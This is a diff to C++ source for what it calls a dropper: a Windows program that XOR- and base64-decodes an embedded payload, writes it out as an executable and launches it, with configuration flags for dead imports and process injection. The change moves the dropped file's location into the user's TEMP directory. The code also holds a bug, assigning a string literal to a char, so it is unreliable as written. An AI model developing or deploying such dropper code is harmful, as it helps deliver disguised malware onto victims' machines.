@@ -17,6 +17,7 @@
 #define DROPPER_OUTPUT "FileSystem_exe_rebuild/FileSystem_exe_rebuild.exe"
 #endif
 
+#include<cstdlib>
 #include<iostream>
 #include<stdio.h>		// Debug Prints
 #include<cstdint>
@@ -51,6 +52,7 @@ void* XOR(void* data, int size);
 void* base64decode(void* data, DWORD* size);
 void launch();
 void set_name();
+void setup_name();
 
 // Dropper Configurations
 #define DEAD_IMPORTS
@@ -59,11 +61,13 @@ void set_name();
 //#define INJECT
 
 // global: final binary name
-char name[512] = "C:/Temp/";
+char name[512];
 
 // Entry Point
 int main(int argc, char* argv[])
 {
+
+	setup_name();
 
 	printf("The macro is: %s. The xor key is: %d. The base64 is: %d\n", DROPPER_OUTPUT, DROPPER_XOR_KEY, DROPPER_BASE64);
 
@@ -103,6 +107,20 @@ int main(int argc, char* argv[])
 	// exit without waiting child process
 
 	return 0;
+}
+
+void setup_name() {
+
+	const char* temp = std::getenv("TEMP");
+
+	if (temp != nullptr){
+		std::strncpy(name, temp, sizeof(name) - 1);
+		name[sizeof(name) - 1] = "\0";
+	}
+	else {
+		printf("Temp was null");
+	}
+
 }
 
 void set_name()
